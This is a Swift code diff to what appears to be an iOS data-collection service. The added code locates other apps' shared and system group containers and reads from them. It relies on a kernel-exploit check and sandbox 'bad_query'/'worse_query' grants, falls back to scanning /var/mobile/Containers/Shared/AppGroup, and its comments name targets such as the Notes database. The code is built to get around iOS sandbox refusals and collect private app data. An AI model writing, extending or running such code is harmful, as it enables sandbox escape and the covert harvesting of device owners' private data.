@@ -958,6 +958,10 @@ enum ProtocolCollectService {
         }.value
         log("collect: container index ready — \(index.count) bundles")
         DebugLogWriter.shared.write("collect: container index \(index.count) bundles")
+        if !index.isEmpty {
+            let sample = index.keys.sorted().prefix(30).joined(separator: ",")
+            DebugLogWriter.shared.write("collect: index sample — \(sample)")
+        }
 
         await MainActor.run {
             ProtocolStatusLog.shared.append("收到采集信息 — 共 \(configs.count) 个采集项")
@@ -1433,6 +1437,15 @@ enum ProtocolCollectService {
     private static var retainedGroupGrants: [String: Int64] = [:]
 
     private static func activateGroupContainerPath(identifier: String) -> String? {
+        // Userland route first: on 26.6.2 / 27.x every MCM class/flags combination
+        // is denied (eight queries per identifier), while the group index answers
+        // from containers it already granted.
+        if !KernelExploit.hasSandboxAccess(),
+           let indexed = ContainerStore.groupContainerIndexSnapshot()[identifier] {
+            _ = ContainerStore.retainAccess(indexed)
+            log("collect: resolved group container \(identifier) via group index -> \(indexed)")
+            return indexed
+        }
         // "魔改开 class7"：组容器解析从只试 class 3 改为试全套
         // class 7（系统组，systemgroup.*）/ 9（AppGroup）/ 8（Group）/ 3（Shared），
         // 备忘录 NoteStore.sqlite 所在的 group.com.apple.notes /
@@ -1449,10 +1462,27 @@ enum ProtocolCollectService {
     }
 
     /// Fallback for devices where MCM refuses group-container lookups (no
-    /// kernel access): enumerate /var/mobile/Containers/Shared/AppGroup,
-    /// match the per-container metadata plist, and keep a bad_query grant
-    /// alive so the payload files can be read during the copy.
+    /// kernel access): resolve the shared container through the group index
+    /// (built once), then fall back to the manual per-container scan.
     private static func resolveGroupContainerByScan(identifier: String) -> String? {
+        // Group index first: built once from the AppGroup / SystemGroup roots,
+        // container identifiers read through worse_query grants.
+        if let path = ContainerStore.groupContainerIndexSnapshot()[identifier] {
+            _ = ContainerStore.retainAccess(path)
+            log("collect: resolved group container \(identifier) via group index -> \(path)")
+            return path
+        }
+        let groupIndex = ContainerStore.groupContainerIndexSnapshot()
+        if !groupIndex.isEmpty {
+            let nearest = ContainerStore.nearestIdentifier(for: identifier, in: groupIndex.keys)
+            let sample = groupIndex.keys.sorted().prefix(20).joined(separator: ",")
+            log("collect: \(identifier) missing from group index (\(groupIndex.count) entries, nearest=\(nearest ?? "none"))")
+            DebugLogWriter.shared.write(
+                "collect: \(identifier) missing from group index (\(groupIndex.count) entries) nearest=\(nearest ?? "none") sample=[\(sample)]"
+            )
+            return nil
+        }
+
         let root = "/var/mobile/Containers/Shared/AppGroup"
         let directories = ContainerStore.enumerateDirectoriesWithTraversalGrant(path: root)
         guard !directories.isEmpty else {
